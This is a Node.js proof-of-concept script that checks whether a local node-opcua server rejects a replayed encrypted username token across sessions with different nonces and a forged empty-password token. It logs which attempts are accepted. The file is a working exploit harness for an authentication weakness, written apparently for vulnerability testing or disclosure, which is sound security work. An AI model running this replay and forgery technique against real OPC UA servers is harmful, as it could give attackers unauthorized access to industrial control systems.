import { generateKeyPairSync } from "node:crypto";
import { createRequire } from "node:module";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { mkdtempSync, rmSync } from "node:fs";

const require = createRequire(import.meta.url);
const {
  getCryptoFactory,
  OPCUACertificateManager,
  OPCUAServer,
  SecurityPolicy,
  UserNameIdentityToken,
} = require("node-opcua");
const aggregateVersion = require("node-opcua/package.json").version;
const serverVersion = require("node-opcua-server/package.json").version;
const pkiRoot = mkdtempSync(join(tmpdir(), "copilot-security-opcua-auth-"));
const accepted = [];
const { privateKey, publicKey } = generateKeyPairSync("rsa", {
  modulusLength: 2048,
});
const server = new OPCUAServer({
  serverCertificateManager: new OPCUACertificateManager({
    rootFolder: join(pkiRoot, "server"),
  }),
  userCertificateManager: new OPCUACertificateManager({
    rootFolder: join(pkiRoot, "users"),
  }),
  userManager: {
    isValidUser(userName, password) {
      accepted.push({ userName, password });
      return (
        userName === "operator" &&
        (password === "correct horse" || password === "")
      );
    },
  },
});
server.getPrivateKey = () => ({ hidden: privateKey });

const securityPolicy = SecurityPolicy.Basic256Sha256;
const cryptoFactory = getCryptoFactory(securityPolicy);
const channel = { securityPolicy };
const userTokenPolicy = { securityPolicyUri: securityPolicy };

function encryptedToken(cleartext) {
  return new UserNameIdentityToken({
    userName: "operator",
    password: cryptoFactory.asymmetricEncrypt(cleartext, publicKey),
    encryptionAlgorithm: cryptoFactory.asymmetricEncryptionAlgorithm,
  });
}

function authenticate(nonce, token) {
  return new Promise((resolve, reject) => {
    server.userNameIdentityTokenAuthenticateUser(
      channel,
      { nonce },
      userTokenPolicy,
      token,
      (error, authorized) =>
        error ? reject(error) : resolve(Boolean(authorized)),
    );
  });
}

try {
  const nonceA = Buffer.alloc(32, 0x41);
  const nonceB = Buffer.alloc(32, 0x42);
  const password = Buffer.from("correct horse", "utf8");
  const boundBlob = Buffer.alloc(4 + password.length + nonceA.length);
  boundBlob.writeUInt32LE(password.length + nonceA.length, 0);
  password.copy(boundBlob, 4);
  nonceA.copy(boundBlob, 4 + password.length);
  const replayedToken = encryptedToken(boundBlob);

  const sessionA = await authenticate(nonceA, replayedToken);
  const sessionB = await authenticate(nonceB, replayedToken);

  const emptyPasswordBlob = Buffer.alloc(4);
  emptyPasswordBlob.writeUInt32LE(nonceA.length, 0);
  const forgedEmptyPassword = await authenticate(
    nonceA,
    encryptedToken(emptyPasswordBlob),
  );

  console.log(
    JSON.stringify({
      aggregateVersion,
      serverVersion,
      sessionA,
      replayedAcrossSessions: sessionB,
      forgedEmptyPassword,
      userManagerCalls: accepted,
    }),
  );
} finally {
  await server.shutdown(0);
  rmSync(pkiRoot, { recursive: true, force: true });
}
